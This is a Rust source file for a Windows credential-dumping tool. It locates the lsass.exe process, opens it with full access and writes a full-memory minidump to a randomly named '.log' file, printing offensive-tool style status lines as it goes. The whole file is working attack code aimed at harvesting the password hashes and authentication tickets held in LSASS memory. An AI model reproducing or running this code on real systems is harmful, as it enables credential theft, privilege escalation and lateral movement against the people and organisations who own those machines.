use std::error::Error;
use std::fs::File;
use std::os::windows::io::AsRawHandle;
use std::path::PathBuf;

use rand::distributions::Alphanumeric;
use rand::prelude::*;
use sysinfo::System;
use windows::Win32::Foundation::*;
use windows::Win32::System::Diagnostics::Debug::*;
use windows::Win32::System::Threading::*;

const LSASS: &str = "lsass.exe";

/// Dump LSASS memory to output file
pub fn dump() -> Result<(), Box<dyn Error>> {
    // Create output file
    let rand: String = thread_rng()
        .sample_iter(&Alphanumeric)
        .take(8)
        .map(char::from)
        .collect();
    let path = format!(".\\{rand}.log");
    println!("[*] Trying to dump to output file: {path}");
    let path = PathBuf::from(path);
    let output = File::create_new(path)?;
    println!("[+] Successfully created output file");

    // Get LSASS pid
    let pid = lsass_pid()?;
    println!("[+] Found {LSASS} pid: {pid}");

    // Open LSASS process
    let proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid)? };
    println!("[+] Successfully opened {LSASS} handle: {proc:?}");

    // Dump lSASS memory to output file and do some cleanup
    unsafe {
        MiniDumpWriteDump(
            proc,
            pid,
            HANDLE(output.as_raw_handle()),
            MiniDumpWithFullMemory,
            None,
            None,
            None,
        )?;

        CloseHandle(proc)?;
    }

    println!("[+] Dump successful!");
    Ok(())
}

/// Get LSASS pid
fn lsass_pid() -> Result<u32, Box<dyn Error>> {
    // Load system information
    let mut sys = System::new_all();
    sys.refresh_all();

    // Find LSASS process
    let proc = sys
        .processes_by_exact_name(LSASS)
        .next()
        .ok_or("Process not found")?;

    // Return pid
    Ok(proc.pid().as_u32())
}
